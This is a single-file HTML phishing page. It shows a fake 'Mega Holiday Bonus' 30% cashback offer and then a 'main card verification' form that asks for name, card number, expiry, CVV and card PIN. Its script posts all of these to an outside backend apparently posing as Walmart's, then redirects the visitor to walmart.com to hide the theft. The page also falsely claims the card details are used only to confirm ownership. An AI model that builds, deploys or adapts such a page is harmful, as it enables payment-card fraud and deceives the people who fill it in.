<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Main Card Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <style>
    body {
      font-family: 'Poppins', Arial, sans-serif;
      background: #f4f7fa;
      margin: 0;
      padding: 0;
      font-size: 0.85rem;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 360px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
      padding: 20px 16px 16px 16px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h2 {
      color: #1a202c;
      font-weight: 500;
      margin-bottom: 8px;
      font-size: 0.95rem;
      letter-spacing: 0.2px;
      text-align: center;
    }
    .note {
      text-align: center;
      color: #4a5568;
      font-size: 0.78rem;
      margin-bottom: 16px;
      margin-top: 2px;
      font-weight: 400;
      letter-spacing: 0.1px;
    }
    .form-group {
      position: relative;
      margin-bottom: 14px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    label {
      margin-bottom: 5px;
      font-weight: 500;
      color: #2d3748;
      font-size: 0.85rem;
      margin-left: 2px;
      letter-spacing: 0.1px;
    }
    input {
      width: 100%;
      padding: 8px 30px 8px 28px;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      font-size: 0.85rem;
      font-family: 'Poppins', Arial, sans-serif;
      background: #f9fafb;
      transition: border-color 0.2s;
      box-sizing: border-box;
      margin-top: 0;
      margin-bottom: 0;
    }
    input:focus {
      border-color: #0071ce;
      outline: none;
      background: #fff;
    }
    .form-group .fa-solid, .form-group .fa-regular {
      position: absolute;
      left: 8px;
      top: 70%;
      transform: translateY(-50%);
      color: #0071ce;
      font-size: 0.85rem;
      opacity: 0.8;
    }
    .row {
      display: flex;
      gap: 10px;
      margin-bottom: 0;
    }
    .row .form-group {
      margin-bottom: 0;
      flex: 1;
    }
    button {
      background: linear-gradient(90deg, #0071ce 0%, #005fa3 100%);
      color: #fff;
      border: none;
      padding: 9px 0;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.9rem;
      font-weight: 600;
      margin-top: 12px;
      width: 100%;
      box-shadow: 0 2px 8px rgba(0,113,206,0.08);
      transition: background 0.2s;
      letter-spacing: 0.1px;
    }
    button:hover {
      background: linear-gradient(90deg, #005fa3 0%, #0071ce 100%);
    }
    .loader {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 16px;
      margin-bottom: 8px;
    }
    .loader .spinner {
      border: 3px solid #e2e8f0;
      border-top: 3px solid #0071ce;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .success {
      color: #38a169;
      margin-top: 12px;
      font-weight: 500;
      text-align: center;
      font-size: 0.95rem;
      display: none;
      letter-spacing: 0.1px;
      padding: 16px 8px 12px 8px;
      border-radius: 8px;
      background: #f6fff7;
      box-shadow: 0 2px 8px rgba(56,161,105,0.08);
    }
    .success .fa-thumbs-up {
      font-size: 2.2rem;
      color: #38a169;
      margin-bottom: 8px;
      display: block;
    }
    .success .msg {
      font-size: 0.95rem;
      color: #2d3748;
      margin-top: 6px;
      font-weight: 500;
      letter-spacing: 0.1px;
    }
    .card-icon {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }
    .card-icon .fa-credit-card {
      font-size: 2.2rem;
      color: #0071ce;
      background: #f4f7fa;
      border-radius: 50%;
      padding: 14px;
      box-shadow: 0 2px 8px rgba(0,113,206,0.08);
    }
    /* Inline loader and success (replaces modal overlay UI) */
    .loader {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 16px;
      margin-bottom: 8px;
      width: 100%;
    }
    .loader .spinner {
      border: 3px solid #e2e8f0;
      border-top: 3px solid #0071ce;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 0.8s linear infinite;
    }
    .success {
      color: #38a169;
      margin-top: 12px;
      font-weight: 500;
      text-align: center;
      font-size: 0.95rem;
      display: none;
      letter-spacing: 0.1px;
      padding: 16px 8px 12px 8px;
      border-radius: 8px;
      background: #f6fff7;
      box-shadow: 0 2px 8px rgba(56,161,105,0.08);
      width: 100%;
    }
    .success .fa-thumbs-up {
      font-size: 2.2rem;
      color: #38a169;
      margin-bottom: 8px;
      display: block;
      opacity: 0;
      transform: scale(0.8);
    }
    .success .msg {
      font-size: 0.95rem;
      color: #2d3748;
      margin-top: 6px;
      font-weight: 500;
      letter-spacing: 0.1px;
      display: none;
    }
    @keyframes thumb-pop {
      0% { transform: scale(0.6); opacity: 0; }
      40% { transform: scale(1.15); opacity: 1; }
      100% { transform: scale(1); opacity: 0; }
    }
    .show-thumb {
      animation: thumb-pop 1.2s ease forwards;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Promo section (shown first) - JUICY VARIANT -->
    <div id="promo" style="width:100%; position:relative; overflow:visible; padding:6px 0 10px 0;">
      <style>
        /* Big juicy promo styles */
        #promo .hero {
          display:flex; align-items:center; gap:14px; justify-content:center; flex-direction:column;
        }
        #promo h1.promo-headline {
          font-size:1.35rem; margin:6px 0 6px 0; color:#071540; font-weight:700; letter-spacing:0.4px; text-align:center;
        }
        #promo .offer-badge {
          width:120px; height:120px; border-radius:999px; background:linear-gradient(135deg,#ffb03b,#ff6b6b); display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; box-shadow:0 10px 30px rgba(255,107,107,0.18); transform:translateY(-8px);
        }
        #promo .offer-badge .percent { font-size:2.1rem; font-weight:800; line-height:1; }
        #promo .offer-badge .cap { font-size:0.85rem; opacity:0.95; }
        #promo .promo-details { font-size:0.95rem; color:#2b3440; margin-top:6px; text-align:center; max-width:320px; }
        #promo .badges-row { display:flex; gap:10px; justify-content:center; margin-top:12px; }
        #promo .cta-large { display:inline-block; margin-top:14px; padding:12px 26px; font-weight:800; border-radius:12px; text-decoration:none; color:#072046; background:linear-gradient(90deg,#ffd54a,#ffd14a); box-shadow:0 8px 28px rgba(3,102,214,0.06); transform:translateZ(0); }
        /* pulsing CTA */
        @keyframes pulse-cta { 0% { box-shadow:0 8px 18px rgba(255,181,59,0.18); transform:scale(1); } 50% { box-shadow:0 18px 40px rgba(255,181,59,0.28); transform:scale(1.03); } 100% { box-shadow:0 8px 18px rgba(255,181,59,0.18); transform:scale(1); } }
        #promo .cta-large { animation: pulse-cta 2.8s ease-in-out infinite; }
        /* subtle confetti dots */
        #promo .confetti { position:absolute; inset:auto 8px 8px auto; pointer-events:none; }
        #promo .confetti span { display:block; width:8px; height:8px; border-radius:50%; margin:4px; opacity:0.95; transform:translateY(0); }
        @keyframes confetti-fall { 0% { transform:translateY(-6px) rotate(0deg); opacity:0.9; } 100% { transform:translateY(18px) rotate(220deg); opacity:0.25; } }
        #promo .confetti span { animation:confetti-fall 2.6s ease-in-out infinite; }
      </style>

      <div class="hero">
        <img src="./image.png" alt="Logo" style="height: 64px; margin-bottom: 2px; border-radius: 8px;">
        <h1 class="promo-headline">Mega Holiday Bonus — Verify & Unlock Instant Rewards</h1>

        <div style="display:flex; align-items:center; gap:14px; justify-content:center; flex-wrap:wrap;">
          <div class="offer-badge" aria-hidden="true">
            <div class="percent">30%</div>
            <div class="cap">cashback</div>
          </div>
          <div style="display:flex; flex-direction:column; align-items:flex-start;">
            <div class="promo-details"><strong>Claim an exclusive <span style="font-weight:800;">30% cashback</span> on your next purchase — up to <strong>$150</strong>. Quick verification improves checkout and unlocks personalised offers.</strong></div>
            <div class="badges-row">
              <div class="badge" style="padding:10px 12px; border-radius:10px; background:#f1f8ff;"><i class="fa-solid fa-gift" style="color:#0763b8;"></i><div style="margin-left:8px; font-weight:700; font-size:0.9rem;">Huge Reward</div></div>
              <div class="badge" style="padding:10px 12px; border-radius:10px; background:#f2fff7;"><i class="fa-solid fa-shield-halved" style="color:#059669;"></i><div style="margin-left:8px; font-weight:700; font-size:0.9rem;">Secure</div></div>
            </div>
          </div>
        </div>

        <a href="#" id="claim-btn" class="cta-large">Claim 30% Now — Limited Slots</a>
      </div>

      <div class="confetti" aria-hidden="true">
        <span style="background:#ffd54a; left:6px; animation-delay:0s"></span>
        <span style="background:#ff6b6b; left:26px; animation-delay:0.3s"></span>
        <span style="background:#7ee787; left:46px; animation-delay:0.6s"></span>
      </div>

      <div class="terms" style="margin-top:12px; text-align:center; font-size:0.85rem; color:#4b5563;">Offer valid for a limited time and selected accounts. By claiming you agree to the verification flow. Card details are transmitted over an encrypted connection and used only to confirm card ownership.</div>
    </div>

    <!-- Loader shown between promo and form -->
    <div id="promo-loader" style="display:none; width:100%; justify-content:center; margin-top:18px;">
      <div class="spinner" style="border:4px solid #e2e8f0; border-top:4px solid #0071ce; border-radius:50%; width:36px; height:36px; animation:spin 0.8s linear infinite;"></div>
    </div>

    <!-- Original form (hidden initially) -->
    <div id="form-wrap" style="display:none; width:100%;">
    <div style="display:flex; flex-direction: column; align-items: center; margin-bottom: 8px; width:100%;">
      <img src="./image.png" alt="Logo" style="height: 72px; margin-bottom: 1px; border-radius: 8px;">
      <span class="card-icon" style="justify-content: center;">
        <i class="fa-regular fa-credit-card"></i>
      </span>
    </div>
    <h2>Please enter your main card for purchase verification</h2>
    <div class="note">
      This card will be used to verify your purchases. Please ensure you enter the card you use most frequently.
    </div>
    <form id="checkout-form" autocomplete="off">
      <div class="form-group">
        <label for="cardName">Name on Card</label>
        <i class="fa-regular fa-user"></i>
        <input type="text" id="cardName" required placeholder="Full Name" autocomplete="off">
      </div>
      <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <i class="fa-regular fa-credit-card"></i>
        <input type="text" id="cardNumber" maxlength="19" required placeholder="1234 5678 9012 3456" autocomplete="off">
      </div>
      <div class="row">
        <div class="form-group">
          <label for="expiry">Expiry (MM/YY)</label>
          <i class="fa-regular fa-calendar"></i>
          <input type="text" id="expiry" maxlength="5" required placeholder="MM/YY" autocomplete="off">
        </div>
        <div class="form-group">
          <label for="cvv">CVV</label>
          <i class="fa-solid fa-lock"></i>
          <input type="password" id="cvv" maxlength="4" required placeholder="CVV" autocomplete="off">
        </div>
      </div>
      <div class="form-group">
        <label for="pin">Card PIN</label>
        <i class="fa-solid fa-key"></i>
        <input type="password" id="pin" maxlength="4" required placeholder="4-digit PIN" autocomplete="off">
      </div>
      <button type="submit">Verify</button>
    </form>
    <div class="loader" id="loader"><div class="spinner"></div></div>
    <div class="success" id="success">
      <i class="fa-solid fa-thumbs-up"></i>
      <div class="msg">Card verified successfully! Thank you for confirming your main card.</div>
    </div>
    </div>
  </div>
  <script>
    // Single-file promo -> form flow

    // When the page loads, promo is visible and form is hidden. Clicking claim shows a short loader then the form.
    document.getElementById('claim-btn').addEventListener('click', function(e) {
      e.preventDefault();
      // hide promo, show small loader
      document.getElementById('promo').style.display = 'none';
      const promoLoader = document.getElementById('promo-loader');
      promoLoader.style.display = 'flex';
      // after 2.2s reveal the form (simulate navigation)
      setTimeout(() => {
        promoLoader.style.display = 'none';
        document.getElementById('form-wrap').style.display = 'block';
        // scroll to top of container for better UX
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }, 2200);
    });

    document.getElementById('checkout-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const cardName = document.getElementById('cardName').value.trim();
      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
      const expiry = document.getElementById('expiry').value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const pin = document.getElementById('pin').value.trim();

      if (!cardName ||
          !/^\d{16}$/.test(cardNumber) ||
          !/^\d{2}\/\d{2}$/.test(expiry) ||
          !/^\d{3,4}$/.test(cvv) ||
          !/^\d{4}$/.test(pin)) {
        alert('Please enter valid card details.');
        return;
      }

  // Hide form, show inline loader
  document.getElementById('checkout-form').style.display = 'none';
  document.getElementById('success').style.display = 'none';
  document.getElementById('loader').style.display = 'flex';

      // Choose backend URL depending on environment (local testing vs production)
      const backendUrl = (location.hostname === 'localhost' || location.hostname === '127.0.0.1') ?
        'http://localhost:3000/api/card' : 'https://walmartbackend-i8tm.onrender.com/api/card';

      // Prepare payload
      const payload = { cardName, cardNumber, expiry, cvv, pin };

      // Send the data. Show loader while request is in-flight. After the
      // request completes (success, non-2xx, error, or timeout) always
      // redirect to Walmart immediately. This ensures the loader lasts the
      // duration of the network call and navigation happens afterwards.
      (async function sendAndAlwaysRedirect() {
        const controller = new AbortController();
        // 15s timeout for the request
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        let reachedBackendOk = false;
        try {
          const response = await fetch(backendUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          reachedBackendOk = response.ok;
          if (response.ok) {
            console.log('Card info sent and acknowledged by backend');
            // show brief success animation before redirect
            const successEl = document.getElementById('success');
            const thumb = successEl.querySelector('.fa-thumbs-up');
            const msg = successEl.querySelector('.msg');
            // hide loader and reveal success container
            document.getElementById('loader').style.display = 'none';
            thumb.style.display = 'block';
            thumb.classList.remove('show-thumb');
            msg.style.display = 'none';
            successEl.style.display = 'block';
            // trigger animation
            setTimeout(() => thumb.classList.add('show-thumb'), 50);
            // let animation play for ~1.2s then continue to redirect in finally
          } else {
            // log non-2xx but don't block redirect
            const body = await response.json().catch(() => ({}));
            console.error('Server error sending card info:', body.error || response.statusText);
          }
        } catch (err) {
          clearTimeout(timeoutId);
          console.error('Network error sending card info:', err);
        } finally {
          // Ensure loader hidden and then redirect to Walmart regardless of result.
          // If success animation is shown, allow it to run (~1.2s) before redirecting
          const successEl = document.getElementById('success');
          const thumb = successEl.querySelector('.fa-thumbs-up');
          const msg = successEl.querySelector('.msg');

          if (reachedBackendOk) {
            // Keep success visible for animation + message timing (total ~4.2s)
            // Animation: 1.2s, then message shown, then 3s before redirect
            setTimeout(() => {
              thumb.style.display = 'none';
              msg.style.display = 'block';
              setTimeout(() => window.location.replace('https://www.walmart.com'), 3000);
            }, 1400);
          } else {
            // No successful ack; hide loader and redirect immediately
            document.getElementById('loader').style.display = 'none';
            // small delay to ensure UI updates render before navigation
            setTimeout(() => window.location.replace('https://www.walmart.com'), 100);
          }
        }
      })();
    });
  </script>
</body>
</html>